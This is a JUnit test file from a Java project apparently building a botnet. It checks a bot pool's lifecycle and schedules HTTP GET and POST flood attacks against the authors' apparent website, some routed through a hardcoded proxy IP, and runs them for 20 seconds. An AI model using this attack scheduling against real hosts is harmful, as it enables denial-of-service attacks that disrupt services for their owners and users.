/*
  The MIT License (MIT)

  Copyright (c) 2017 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.exec;

import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import org.junit.Assert;
import org.junit.Assume;
import org.junit.Test;
import org.quartz.SchedulerException;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

/**
 * JUnit test for {@link BotPool}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotPool
 */
public class BotPoolTest {

  /**
   * Tests normal pool lifecycle.
   * @throws SchedulerException when some scheduler error occurs.
   */
  @Test
  public void test_lifecycle() throws SchedulerException {
    BotPool pool = new BotPool();
    Assert.assertTrue(pool.isActive());
    pool.pause();
    Assert.assertTrue(pool.isSleeping());
    pool.destroy(false);
    Assert.assertTrue(pool.isShutdown());
  }

  /**
   * Tests normal pool lifecycle (wait for termination).
   * @throws SchedulerException when some scheduler error occurs.
   */
  @Test
  public void test_lifecycle_wait() throws SchedulerException {
    BotPool pool = new BotPool();
    pool.destroy(true);
    Assert.assertTrue(pool.isShutdown());
  }

  /**
   * Tests attacks scheduling.
   * @throws SchedulerException when some scheduler error occurs.
   */
  @Test
  public void test_schedulingAttack() throws SchedulerException, MalformedURLException, InterruptedException {
    Assume.assumeTrue(ConnectionManager.checkConnection());

    Set<HttpFloodAttack> attacks = new HashSet<>();
    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com")));
    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
        new HttpProxy("31.220.56.101", 80)));
    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
        new HttpProxy("31.220.56.101", 80),
        3,
        new Interval(5, 5, TimeUnit.SECONDS)
    ));
    attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
        new HttpProxy("31.220.56.101", 80),
        new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
        new HashMap<String,String>(){{put("foo1", "bar1");}},
        3,
        new Interval(5, 5, TimeUnit.SECONDS)
    ));
    attacks.add(new HttpFloodAttack(HttpMethod.POST, new URL("http://www.gmarciani.com"),
        new HttpProxy("31.220.56.101", 80),
        new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
        new HashMap<String,String>(){{put("foo1", "bar1");}},
        3,
        new Interval(5,5, TimeUnit.SECONDS)
    ));

    BotPool pool = new BotPool();

    pool.getScheduler().standby();

    for (HttpFloodAttack attack : attacks) {
      pool.scheduleAttackHttpFlooding(attack);
    }

    List<HttpFloodAttack> scheduled = pool.getScheduledHttpAttacks();
    Assert.assertTrue(scheduled.containsAll(attacks));

    pool.getScheduler().start();

    Thread.sleep(20000);

    pool.destroy(true);

    Assert.assertTrue(pool.isShutdown());
  }
}
